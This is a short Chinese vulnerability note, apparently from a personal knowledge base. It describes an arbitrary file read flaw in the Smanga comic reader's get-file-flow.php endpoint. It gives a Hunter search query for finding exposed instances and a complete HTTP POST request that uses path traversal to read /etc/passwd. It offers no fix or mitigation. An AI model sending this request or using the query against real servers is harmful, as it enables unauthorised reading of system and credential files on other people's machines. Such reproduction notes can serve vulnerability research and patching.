# Smanga get-file-flow存在任意文件读取漏洞

# 一、漏洞简介
Smanga无需配置，docker直装的漫画流媒体阅读工具。以emby plex为灵感，为解决漫画阅读需求而开发的漫画阅读器。Smanga get-file-flow存在任意文件读取漏洞。

# 二、影响版本
+ Smanga

# 三、资产测绘
+ hunter`web.title=="smanga"`
+ 特征

![1704896644693-d87321ff-18ab-47ce-a047-0b7cbeb372e0.png](./img/SNJ9xiUHBOpb3lvb/1704896644693-d87321ff-18ab-47ce-a047-0b7cbeb372e0-090368.png)

# 四、漏洞复现
```java
POST /php/get-file-flow.php HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ak;q=0.8
Cookie: thinkphp_show_page_trace=0|0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

file=../../../../../../../../etc/passwd
```

![1704897506388-882229d5-e4a4-452e-9b33-c85efb044957.png](./img/SNJ9xiUHBOpb3lvb/1704897506388-882229d5-e4a4-452e-9b33-c85efb044957-170447.png)



> 更新: 2024-02-29 23:55:42  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fgkpb2mlbe6egiwy>